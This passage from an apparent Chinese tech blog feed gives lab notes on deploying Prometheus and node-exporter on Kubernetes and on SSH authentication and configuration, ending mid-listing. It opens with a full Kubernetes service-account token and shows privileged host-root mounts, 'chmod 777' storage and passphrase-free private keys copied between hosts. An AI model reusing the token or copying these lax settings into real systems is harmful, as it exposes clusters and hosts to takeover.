eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9FeEZPa0pTcnF6Yl9tMzVkQUZRS3lISTdVZjhvTGNGZ0lDdjJtQjRSQzAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJtb25pdG9yLXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6Im1vbml0b3ItdG9rZW4tdjVuNGciLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoibW9uaXRvciIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6Ijk5ZmM1Y2I5LTcxYjMtNGEwMS1hOWJmLWM2OWRhNzEzODU4YyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDptb25pdG9yLXNhOm1vbml0b3IifQ.y8g-OFCoxbHUEsCRb3FHokaP24Dt6fWLl2a6Q-9R3R_Y38XkrOMiQZF64R8Xcc0mpMqd62HjhLEAxVE-9g4sINquQ41aDDBIFGuGPXsWVQBe5ZU2ktXh4y8W5YzxuxEzn8sA5--RgrOPJrd8aHh5w3QVECuCl9zL1cFUno8g904nXvEgZqU8VM6sj3CMwy3ovbHFU7OabREjJ3WiG1S--8G1VqD18qXbxCPmPt9nGaES2C_z_41Ujqk-O6iv6ASlBSTJqWpYTb7_YeSNp5Relyr-f-lhdTQC_XrNArtO_P2wZ2lgSP3qWtIrmsjqkCEYZNYOzs5xI5nJiomSjnhOPw"</span></span><br></pre></td></tr></table></figure><h3 id="node-exporter"><a href="#node-exporter" class="headerlink" title="node-exporter"></a>node-exporter</h3><p>主要用于采集node节点监控指标数据，能够采集到主机的运行指标如CPU,、内存、磁盘、网络、文件数等信息。</p><h4 id="常见指标-1"><a href="#常见指标-1" class="headerlink" title="常见指标"></a>常见指标</h4><table><thead><tr><th>指标名称</th><th>含义</th></tr></thead><tbody><tr><td>node_boot_time</td><td>系统启动时间</td></tr><tr><td>node_cpu</td><td>系统CPU使用量</td></tr><tr><td>nodedisk*</td><td>磁盘IO</td></tr><tr><td>nodefilesystem*</td><td>文件系统用量</td></tr><tr><td>node_load1</td><td>系统负载</td></tr><tr><td>nodememeory*</td><td>内存使用量</td></tr><tr><td>nodenetwork*</td><td>网络带宽</td></tr><tr><td>node_time</td><td>当前系统时间</td></tr><tr><td>go_*</td><td>node exporter中go相关指标</td></tr><tr><td>process_*</td><td>node exporter自身进程相关运行指标</td></tr></tbody></table><h4 id="部署-1"><a href="#部署-1" class="headerlink" title="部署"></a>部署</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解压镜像，放到master和node节点给上执行</span></span><br><span class="line">docker load -i node-exporter_v0_16.tar.gz</span><br><span class="line">ansible all -m shell -a <span class="string">'docker load -i node-exporter_v0_16.tar.gz'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建yaml文件</span></span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: DaemonSet</span><br><span class="line">metadata:</span><br><span class="line">  name: node-exporter</span><br><span class="line">  namespace: monitor-sa</span><br><span class="line">  labels:</span><br><span class="line">    name: node-exporter</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">     name: node-exporter</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        name: node-exporter</span><br><span class="line">    spec:</span><br><span class="line">      hostPID: <span class="literal">true</span></span><br><span class="line">      hostIPC: <span class="literal">true</span></span><br><span class="line">      hostNetwork: <span class="literal">true</span></span><br><span class="line">      containers:</span><br><span class="line">      - name: node-exporter</span><br><span class="line">        image: prom/node-exporter:v0.16.0</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9100</span><br><span class="line">        resources:</span><br><span class="line">          requests:</span><br><span class="line">            cpu: 0.15</span><br><span class="line">        securityContext:</span><br><span class="line">          privileged: <span class="literal">true</span></span><br><span class="line">        args:</span><br><span class="line">        - --path.procfs</span><br><span class="line">        - /host/proc</span><br><span class="line">        - --path.sysfs</span><br><span class="line">        - /host/sys</span><br><span class="line">        - --collector.filesystem.ignored-mount-points</span><br><span class="line">        - <span class="string">'"^/(sys|proc|dev|host|etc)($|/)"'</span></span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: dev</span><br><span class="line">          mountPath: /host/dev</span><br><span class="line">        - name: proc</span><br><span class="line">          mountPath: /host/proc</span><br><span class="line">        - name: sys</span><br><span class="line">          mountPath: /host/sys</span><br><span class="line">        - name: rootfs</span><br><span class="line">          mountPath: /rootfs</span><br><span class="line">      tolerations:</span><br><span class="line">      - key: <span class="string">"node-role.kubernetes.io/master"</span></span><br><span class="line">        operator: <span class="string">"Exists"</span></span><br><span class="line">        effect: <span class="string">"NoSchedule"</span></span><br><span class="line">      volumes:</span><br><span class="line">        - name: proc</span><br><span class="line">          hostPath:</span><br><span class="line">            path: /proc</span><br><span class="line">        - name: dev</span><br><span class="line">          hostPath:</span><br><span class="line">            path: /dev</span><br><span class="line">        - name: sys</span><br><span class="line">          hostPath:</span><br><span class="line">            path: /sys</span><br><span class="line">        - name: rootfs</span><br><span class="line">          hostPath:</span><br><span class="line">            path: /</span><br><span class="line"><span class="comment">#部署</span></span><br><span class="line">kubectl apply -f node-exporter.yaml</span><br><span class="line"><span class="comment">#查看获取的数据</span></span><br><span class="line">curl http://192.168.163.132:9100/metrics</span><br></pre></td></tr></table></figure><h3 id="部署Prometheus"><a href="#部署Prometheus" class="headerlink" title="部署Prometheus"></a>部署Prometheus</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#装载镜像</span></span><br><span class="line">docker load -i prometheus_v2_2_1.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#在k8s-node节点创建一个存储prometheus数据的目录</span></span><br><span class="line">mkdir /data</span><br><span class="line">chmod 777 /data/</span><br><span class="line"><span class="comment">#在k8s-master节点执行如下</span></span><br><span class="line">kubectl apply -f prometheus-cfg.yaml</span><br><span class="line">kubectl apply -f prometheus-deploy.yaml</span><br><span class="line">kubectl apply -f prometheus-svc.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#prometheus-cfg.yaml</span></span><br><span class="line">kind: ConfigMap</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: prometheus</span><br><span class="line">  name: prometheus-config</span><br><span class="line">  namespace: monitor-sa</span><br><span class="line">data:</span><br><span class="line">  prometheus.yml: |</span><br><span class="line">    global:</span><br><span class="line">      scrape_interval: 15s<span class="comment">#收集数据间隔</span></span><br><span class="line">      scrape_timeout: 10s<span class="comment">#收集书超时时间</span></span><br><span class="line">      evaluation_interval: 1m<span class="comment">#警报规则计算周期，计算后更新警报状态</span></span><br><span class="line">    scrape_configs:</span><br><span class="line">    - job_name: <span class="string">'kubernetes-node'</span></span><br><span class="line">      kubernetes_sd_configs:</span><br><span class="line">      - role: node</span><br><span class="line">      relabel_configs:</span><br><span class="line">      - source_labels: [__address__]</span><br><span class="line">        regex: <span class="string">'(.*):10250'</span></span><br><span class="line">        replacement: <span class="string">'$&#123;1&#125;:9100'</span></span><br><span class="line">        target_label: __address__</span><br><span class="line">        action: replace</span><br><span class="line">      - action: labelmap</span><br><span class="line">        regex: __meta_kubernetes_node_label_(.+)</span><br><span class="line">    - job_name: <span class="string">'kubernetes-node-cadvisor'</span></span><br><span class="line">      kubernetes_sd_configs:</span><br><span class="line">      - role:  node</span><br><span class="line">      scheme: https</span><br><span class="line">      tls_config:</span><br><span class="line">        ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt</span><br><span class="line">      bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token</span><br><span class="line">      relabel_configs:</span><br><span class="line">      - action: labelmap</span><br><span class="line">        regex: __meta_kubernetes_node_label_(.+)</span><br><span class="line">      - target_label: __address__</span><br><span class="line">        replacement: kubernetes.default.svc:443</span><br><span class="line">      - source_labels: [__meta_kubernetes_node_name]</span><br><span class="line">        regex: (.+)</span><br><span class="line">        target_label: __metrics_path__</span><br><span class="line">        replacement: /api/v1/nodes/<span class="variable">$&#123;1&#125;</span>/proxy/metrics/cadvisor</span><br><span class="line">    - job_name: <span class="string">'kubernetes-apiserver'</span></span><br><span class="line">      kubernetes_sd_configs:</span><br><span class="line">      - role: endpoints</span><br><span class="line">      scheme: https</span><br><span class="line">      tls_config:</span><br><span class="line">        ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt</span><br><span class="line">      bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token</span><br><span class="line">      relabel_configs:</span><br><span class="line">      - source_labels: [__meta_kubernetes_namespace, __meta_kubernetes_service_name, __meta_kubernetes_endpoint_port_name]</span><br><span class="line">        action: keep</span><br><span class="line">        regex: default;kubernetes;https</span><br><span class="line">    - job_name: <span class="string">'kubernetes-service-endpoints'</span></span><br><span class="line">      kubernetes_sd_configs:</span><br><span class="line">      - role: endpoints</span><br><span class="line">      relabel_configs:</span><br><span class="line">      - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scrape]</span><br><span class="line">        action: keep</span><br><span class="line">        regex: <span class="literal">true</span></span><br><span class="line">      - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scheme]</span><br><span class="line">        action: replace</span><br><span class="line">        target_label: __scheme__</span><br><span class="line">        regex: (https?)</span><br><span class="line">      - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_path]</span><br><span class="line">        action: replace</span><br><span class="line">        target_label: __metrics_path__</span><br><span class="line">        regex: (.+)</span><br><span class="line">      - source_labels: [__address__, __meta_kubernetes_service_annotation_prometheus_io_port]</span><br><span class="line">        action: replace</span><br><span class="line">        target_label: __address__</span><br><span class="line">        regex: ([^:]+)(?::\d+)?;(\d+)</span><br><span class="line">        replacement: <span class="variable">$1</span>:<span class="variable">$2</span></span><br><span class="line">      - action: labelmap</span><br><span class="line">        regex: __meta_kubernetes_service_label_(.+)</span><br><span class="line">      - source_labels: [__meta_kubernetes_namespace]</span><br><span class="line">        action: replace</span><br><span class="line">        target_label: kubernetes_namespace</span><br><span class="line">      - source_labels: [__meta_kubernetes_service_name]</span><br><span class="line">        action: replace</span><br><span class="line">        target_label: kubernetes_name</span><br><span class="line">        </span><br><span class="line"><span class="comment">#prometheus-deploy.yaml，设置nodeName部署在master上</span></span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: prometheus-server</span><br><span class="line">  namespace: monitor-sa</span><br><span class="line">  labels:</span><br><span class="line">    app: prometheus</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: prometheus</span><br><span class="line">      component: server</span><br><span class="line">    <span class="comment">#matchExpressions:</span></span><br><span class="line">    <span class="comment">#- &#123;key: app, operator: In, values: [prometheus]&#125;</span></span><br><span class="line">    <span class="comment">#- &#123;key: component, operator: In, values: [server]&#125;</span></span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: prometheus</span><br><span class="line">        component: server</span><br><span class="line">      annotations:</span><br><span class="line">        prometheus.io/scrape: <span class="string">'false'</span></span><br><span class="line">    spec:</span><br><span class="line">      nodeName: localhost.localdomain</span><br><span class="line">      serviceAccountName: monitor</span><br><span class="line">      containers:</span><br><span class="line">      - name: prometheus</span><br><span class="line">        image: prom/prometheus:v2.2.1</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        <span class="built_in">command</span>:</span><br><span class="line">          - prometheus</span><br><span class="line">          - --config.file=/etc/prometheus/prometheus.yml</span><br><span class="line">          - --storage.tsdb.path=/prometheus</span><br><span class="line">          - --storage.tsdb.retention=720h</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9090</span><br><span class="line">          protocol: TCP</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /etc/prometheus/prometheus.yml</span><br><span class="line">          name: prometheus-config</span><br><span class="line">          subPath: prometheus.yml</span><br><span class="line">        - mountPath: /prometheus/</span><br><span class="line">          name: prometheus-storage-volume</span><br><span class="line">      volumes:</span><br><span class="line">        - name: prometheus-config</span><br><span class="line">          configMap:</span><br><span class="line">            name: prometheus-config</span><br><span class="line">            items:</span><br><span class="line">              - key: prometheus.yml</span><br><span class="line">                path: prometheus.yml</span><br><span class="line">                mode: 0644</span><br><span class="line">        - name: prometheus-storage-volume</span><br><span class="line">          hostPath:</span><br><span class="line">           path: /data</span><br><span class="line">           <span class="built_in">type</span>: Directory</span><br><span class="line"></span><br><span class="line"><span class="comment">#prometheus-svc.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: prometheus</span><br><span class="line">  namespace: monitor-sa</span><br><span class="line">  labels:</span><br><span class="line">    app: prometheus</span><br><span class="line">spec:</span><br><span class="line">  <span class="built_in">type</span>: NodePort</span><br><span class="line">  ports:</span><br><span class="line">    - port: 9090</span><br><span class="line">      targetPort: 9090</span><br><span class="line">      nodePort: 30090</span><br><span class="line">      protocol: TCP</span><br><span class="line">  selector:</span><br><span class="line">    app: prometheus</span><br><span class="line">    component: server</span><br><span class="line">    </span><br><span class="line"><span class="comment">#访问Prometheus自带的web界面</span></span><br><span class="line">192.168.163.132:30090</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#警报状态</span></span><br><span class="line">inactive：没有触发阈值</span><br><span class="line">pending：已触发阈值但未满足告警持续时间</span><br><span class="line">firing：已触发阈值且满足告警持续时间</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这个系列文章将Prometheus部署在k8s集群中进行实验。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Prometheus" scheme="http://yoursite.com/categories/Prometheus/"/>
    
    
      <category term="Prometheus" scheme="http://yoursite.com/tags/Prometheus/"/>
    
  </entry>
  
  <entry>
    <title>ssh基本使用及工作原理</title>
    <link href="http://yoursite.com/2020/03/07/ssh%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/03/07/ssh%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</id>
    <published>2020-03-07T14:32:58.000Z</published>
    <updated>2020-03-21T10:06:45.286Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ul><li>ssh是一个基于传输层和应用层的安全协议，它使用对称密钥来进行会话之间加密，使用非对称密钥来进行身份的验证（关于密钥相关的知识在“运维安全基础”里已经做了基本介绍）</li><li>ssh服务端守护进程为sshd，默认监听在22端口，一般安全起见可以通过配置文件修改</li><li>ssh验证过程主要分为主机认证和身份认证两方面。主机认证用于记录连接主机的身份，可以记录每个主机连接多少个用户；身份认证一般通过公钥私钥的非对称密钥进行通信确认。</li><li>ssh客户端配置文件为/etc/ssh/ssh_config，服务端配置文件为/etc/ssh/sshd_config</li><li>做ssh服务端时，会有服务端自己的私钥和公钥用于建立连接使用，存放在/etc/ssh目录下，最下面两个即为用于连接认证的公钥和私钥。</li><li>ssh执行后在对端开启一个伪终端来执行后续操作，如果身份认证不能使用伪终端，那么认证会失败。<a id="more"></a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ssh]# ls -l</span><br><span class="line">total 604</span><br><span class="line">-rw-r--r--. 1 root root     581843 Aug  9  2019 moduli</span><br><span class="line">-rw-r--r--. 1 root root       2276 Aug  9  2019 ssh_config</span><br><span class="line">-rw-------. 1 root root       3907 Aug  9  2019 sshd_config</span><br><span class="line">-rw-r-----. 1 root ssh_keys    227 Jan 12 19:41 ssh_host_ecdsa_key</span><br><span class="line">-rw-r--r--. 1 root root        162 Jan 12 19:41 ssh_host_ecdsa_key.pub</span><br><span class="line">-rw-r-----. 1 root ssh_keys    387 Jan 12 19:41 ssh_host_ed25519_key</span><br><span class="line">-rw-r--r--. 1 root root         82 Jan 12 19:41 ssh_host_ed25519_key.pub</span><br><span class="line">-rw-r-----. 1 root ssh_keys   1675 Jan 12 19:41 ssh_host_rsa_key</span><br><span class="line">-rw-r--r--. 1 root root        382 Jan 12 19:41 ssh_host_rsa_key.pub</span><br></pre></td></tr></table></figure><h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><p>测试环境：客户端A，连接服务端B</p><h4 id="主机认证"><a href="#主机认证" class="headerlink" title="主机认证"></a>主机认证</h4><p>首先A输入ssh ip_B后，B会将其公钥(即ssh_host_rsa_key.pub)发送给客户端，客户端的家目录维持着一个known_hosts文件(~/.ssh/known_hosts)，它存放了已认证过的主机的用于主机认证的公钥，并且前面的地址是用于索引密钥的，我们就把这个一条记录称为host_key。如果A没有B公钥的存储，那么就提示用户是否保存，如果有就进行对称密钥的交换。因此，如果一个已经连接过的主机突然连接不上了，可以考虑删除这个文件，重新连接重新生成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#显示的是已连接过的主机ip名称以及对应ip主机的公钥，即135主机的ssh_host_rsa_key.pub保存的公钥</span></span><br><span class="line">192.168.163.135 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9LdkuM2hCuoQh0ahIpaLMm6wmXfMernMfSCyB76aDrDdC1rF/94fMW0cx8e5uMXbG6HOkVYelQf9CNIcdHtpY=</span><br><span class="line"></span><br><span class="line"><span class="comment">#135主机的公钥信息，此处不同是因为ecdsa-sha2-nistp256问题，理论上如果都使用rsa格式显示的话是一致的</span></span><br><span class="line">[root@node1 ~]% ifconfig | awk <span class="string">'/inet 192/&#123;print $2&#125;'</span></span><br><span class="line">192.168.163.135</span><br><span class="line">[root@node1 ~]% cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmaMKNlIJMVoA1B390hWvwis8DDJYeNRUKpYtldprTOvqO3U4HJKnZuPQxuMplgOfv5NMIhW0fF8SGcgAXaJBUQIPDkjtnOhp42mTH79iHxpFO3OEAaG3/MwBb8dV4vuM51eSpmRzTDhPXKlCQRDOtI9902sMz2c549+iPUlS8MAaJ3xcvbGTLYMktCNiRVwhicHCdb16lfC7f/RVMPUDoVALPAIkwWc3cbEWSApIhSFnTz0FpyeRaqyGE4lwmbKl2MdshN9qnJ24t54eyR1+kejmsvWBIEQcPZ1DBvMx6Ex/Ak6qiTwpGYQbDT2CzvRIr5+epVUKfZScX9Qo7h2rX</span><br></pre></td></tr></table></figure><p>对称密钥一般使用DH算法进行交换(DH算法也在“运维安全基础”提到过)，具体使用什么对称密钥算法是在B一开始发送公钥给客户端时就发送过来B支持的密钥列表，客户端根据此就可以决定使用哪个对称密钥加密方法来维持后续通信。</p><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><p>主机认证无误后进入身份认证，一般有密钥以及密码认证，此处使用密钥认证来解释过程。首先，A将自己的公钥发送给B(存放在/root/.ssh/authorized_keys文件中)，B生成一个随机数附加在之前的对称密钥上，然后使用A的公钥加密后发给A，A收到后使用自己的私钥解密，解密后使用md5进行hash运算，运算后将hash结果发给B，B收到后也将原来的数据进行hash运算，如果运算无误，那么就正式完成加密通道的建立，此后使用对称密钥进行通信。</p><h5 id="客户端发送公钥"><a href="#客户端发送公钥" class="headerlink" title="客户端发送公钥"></a>客户端发送公钥</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成密钥，公钥+私钥，默认也生成在~/.ssh/id_rsa下，-P ''指定加密私钥文件的密码为空密码，即不加密</span></span><br><span class="line">ssh-keygen -t rsa -f ~/.ssh/id_rsa -P <span class="string">''</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝公钥给服务端，注意，如果不是监听22端口则使用-p指令指定端口</span></span><br><span class="line">ssh-copy-id server_ip</span><br></pre></td></tr></table></figure><h5 id="服务端发放公钥"><a href="#服务端发放公钥" class="headerlink" title="服务端发放公钥"></a>服务端发放公钥</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成密钥</span></span><br><span class="line">ssh-keygen -f ~/.ssh/id_rsa -P <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务端copy上述的公钥到自己的authorized_keys文件中</span></span><br><span class="line">ssh-copy-id server_ip</span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝密钥到客户端即可</span></span><br><span class="line">scp -p ~/.ssh/id_rsa* client_ip:/root/.ssh/</span><br></pre></td></tr></table></figure><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>一般关闭GSSAPI来提高认证速度，因为GSSAPI认证优先级在密钥和密码之前，且其验证过程很慢，效率不高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># Host *                              # Host指令是ssh_config中最重要的指令，只有ssh连接的目标主机名能匹配此处给定模式时，</span><br><span class="line">                                      # 下面一系列配置项直到出现下一个Host指令才对此次连接生效</span><br><span class="line">#   ForwardAgent no</span><br><span class="line">#   ForwardX11 no</span><br><span class="line">#   RhostsRSAAuthentication no</span><br><span class="line">#   RSAAuthentication yes</span><br><span class="line">#   PasswordAuthentication yes     # 是否启用基于密码的身份认证机制</span><br><span class="line">#   HostbasedAuthentication no     # 是否启用基于主机的身份认证机制</span><br><span class="line">#   GSSAPIAuthentication no        # 是否启用基于GSSAPI的身份认证机制</span><br><span class="line">#   GSSAPIDelegateCredentials no</span><br><span class="line">#   GSSAPIKeyExchange no</span><br><span class="line">#   GSSAPITrustDNS no</span><br><span 